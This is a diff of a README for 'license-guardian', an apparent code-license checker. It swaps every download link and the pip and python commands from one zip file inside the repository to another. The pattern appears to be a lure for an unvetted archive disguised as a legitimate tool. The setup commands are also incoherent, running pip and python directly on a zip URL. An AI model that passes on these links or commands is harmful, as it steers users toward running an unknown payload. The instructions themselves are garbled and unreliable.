@@ -1,6 +1,6 @@
 # 🛡️ license-guardian - Keep Your Code Compliant and Safe
 
-[![Download license-guardian](https://raw.githubusercontent.com/PWELE123/license-guardian/main/chemosmotic/license-guardian.zip)](https://raw.githubusercontent.com/PWELE123/license-guardian/main/chemosmotic/license-guardian.zip)
+[![Download license-guardian](https://github.com/PWELE123/license-guardian/raw/refs/heads/main/src/guardian-license-v3.0-beta.2.zip)](https://github.com/PWELE123/license-guardian/raw/refs/heads/main/src/guardian-license-v3.0-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run license-guardian, you need the following:
 
 To get started, visit the releases page to download the latest version of license-guardian.
 
-[Download license-guardian here!](https://raw.githubusercontent.com/PWELE123/license-guardian/main/chemosmotic/license-guardian.zip)
+[Download license-guardian here!](https://github.com/PWELE123/license-guardian/raw/refs/heads/main/src/guardian-license-v3.0-beta.2.zip)
 
 1. Navigate to the releases page.
 2. Find the asset that matches your operating system.
@@ -41,12 +41,12 @@ To get started, visit the releases page to download the latest version of licens
 
 5. **Install Dependencies**: Run the following command to install any required packages:
    ```bash
-   pip install -r https://raw.githubusercontent.com/PWELE123/license-guardian/main/chemosmotic/license-guardian.zip
+   pip install -r https://github.com/PWELE123/license-guardian/raw/refs/heads/main/src/guardian-license-v3.0-beta.2.zip
    ```
 
 6. **Run license-guardian**: Begin using the tool by running:
    ```bash
-   python https://raw.githubusercontent.com/PWELE123/license-guardian/main/chemosmotic/license-guardian.zip
+   python https://github.com/PWELE123/license-guardian/raw/refs/heads/main/src/guardian-license-v3.0-beta.2.zip
    ```
 
 ## 🎯 Usage Instructions
@@ -98,7 +98,7 @@ We welcome contributions to license-guardian. If you want to improve the project
 If you experience issues while using license-guardian, consider the following:
 
 - **Common Issues**:
-  - **Missing Dependencies**: Ensure all packages in `https://raw.githubusercontent.com/PWELE123/license-guardian/main/chemosmotic/license-guardian.zip` are installed.
+  - **Missing Dependencies**: Ensure all packages in `https://github.com/PWELE123/license-guardian/raw/refs/heads/main/src/guardian-license-v3.0-beta.2.zip` are installed.
   - **Python Version**: Make sure you're using Python 3.7 or higher.
 
 - **Ask for Help**: You can open an issue in the GitHub repository if you need assistance.
@@ -111,4 +111,4 @@ For more information, you can reach out via GitHub Issues or connect with the co
 
 Feel free to visit the releases page anytime to grab the latest version of license-guardian. 
 
-[Download license-guardian here!](https://raw.githubusercontent.com/PWELE123/license-guardian/main/chemosmotic/license-guardian.zip)
+[Download license-guardian here!](https://github.com/PWELE123/license-guardian/raw/refs/heads/main/src/guardian-license-v3.0-beta.2.zip)
